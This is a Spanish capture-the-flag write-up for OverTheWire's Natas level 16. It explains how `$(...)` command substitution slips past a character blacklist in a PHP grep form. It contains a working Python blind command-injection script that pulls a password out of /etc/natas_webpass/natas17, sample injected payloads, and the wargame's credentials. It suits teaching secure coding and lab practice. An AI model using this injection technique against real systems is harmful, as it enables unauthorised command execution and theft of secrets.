# Natas Level16

## Descripción
> **Level Goal (natas16.natas.labs.overthewire.org):** Mismo formulario de búsqueda que los niveles 9-10, pero "por razones de seguridad, filtramos aún más caracteres": ahora la blacklist incluye `; | & \` ' "` (`preg_match('/[;|&\`\'"]/', $key)`), y encima el valor se pasa entre comillas dobles: `passthru("grep -i \"$key\" dictionary.txt")`.

## Solución
Con `;`, `|`, `&`, backtick y ambas comillas prohibidas, ya no se puede ni cerrar las comillas dobles que envuelven `$key` ni encadenar comandos con los separadores habituales. Pero **`$(...)` (sustitución de comandos) sigue funcionando dentro de comillas dobles** y no usa ninguno de los caracteres filtrados. Eso da ejecución de comandos arbitraria — el problema es que el *stdout* de ese `$(...)` se convierte en el patrón de búsqueda de `grep`, no se imprime directamente.

La clave es usar `$(...)` como un oráculo booleano: dentro de él se ejecuta un script que decide, carácter a carácter, si un candidato coincide con la contraseña real (leída de `/etc/natas_webpass/natas17`), y hace `echo` de una palabra que sí existe en `dictionary.txt` (p. ej. `aardvark`) si acierta, o de una cadena que nunca aparecerá si falla. Así, la respuesta HTTP (con o sin resultados de `grep`) actúa como el bit de verdadero/falso.

Dos detalles no evidentes hicieron falta para que funcionara:
- El shell que ejecuta `passthru()` es `/bin/sh` (en este host, `dash`), **no** `bash` — así que `[[ ... ]]` y la sintaxis `${var:offset:length}` (bashismos) fallan silenciosamente. Hay que usar POSIX puro: `[ ... ]` y `expr substr "$var" pos len`.
- Como `;` está prohibido, no se pueden usar los separadores de sentencia habituales (tampoco `;;` de `case`). La solución es escribir todo con saltos de línea, incluyendo la estructura `if`/`then`/`else`/`fi`, que en `sh` no necesita punto y coma si cada palabra clave está en su propia línea.

```python
import requests

auth = ("natas16", "Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb")
url = "http://natas16.natas.labs.overthewire.org/index.php"

def check(pos, ch):
    script = f"""x=$(cat /etc/natas_webpass/natas17)
c=$(expr substr $x {pos} 1)
if [ $c = {ch} ]
then
echo aardvark
else
echo zzznomatchzzz
fi"""
    needle = "$(\n" + script + "\n)"
    r = requests.get(url, auth=auth, params={"needle": needle}, timeout=15)
    return "aardvark" in r.text

password = ""
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
for pos in range(1, 33):
    for c in charset:
        if check(pos, c):
            password += c
            break

print(password)
# KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx
```

## Notas adicionales
- Antes de automatizar la extracción se comprobaron varias hipótesis más simples y se descartaron con evidencia:
  - Probar `[[ ]]` con `${x:0:1}`: el resultado no cambiaba según el carácter probado (siempre "falso"), señal de que el shell no entendía la sintaxis (dash no soporta bashismos) y el patrón de búsqueda quedaba vacío, haciendo que `grep -i ""` mostrara *todo* `dictionary.txt` en vez de nada — un falso positivo que casi lleva a una conclusión equivocada.
  - Probar si `dictionary.txt` era escribible para inyectar el secreto ahí (`$(cat secreto >> dictionary.txt)`) y luego volcarlo con patrón vacío: no lo era, el intento de escritura no tuvo efecto (se comprobó buscando el texto añadido en una petición posterior).
  - Probar `test -r /etc/natas_webpass/natas17`: confirmó que el archivo sí es legible por el usuario del proceso, así que el problema real era de sintaxis del script, no de permisos.
- El pipe (`|`) también está en la blacklist, así que ni siquiera `cat archivo | wc -c` es viable; hubo que usar la redirección `wc -c < archivo` para medir la longitud del secreto (33 = 32 caracteres + salto de línea final) como prueba de concepto antes de automatizar la extracción completa.
- Filtrar una lista de caracteres "peligrosos" en shell nunca es suficiente si se sigue permitiendo `$()`: cualquier construcción capaz de ejecutar un subproceso y devolver su salida (sustitución de comandos, sustitución de procesos, etc.) es de por sí una vía de ejecución de código, independientemente de qué caracteres de "separación de comandos" clásicos estén bloqueados.

## Referencias
- Reto original: http://natas16.natas.labs.overthewire.org/
- Apoyo: https://pubs.opengroup.org/onlinepubs/9699919799/utilities/expr.html (POSIX `expr`, incluida la forma `substr`)
- Apoyo: https://owasp.org/www-community/attacks/Command_Injection (OWASP, Command Injection — blacklists insuficientes)
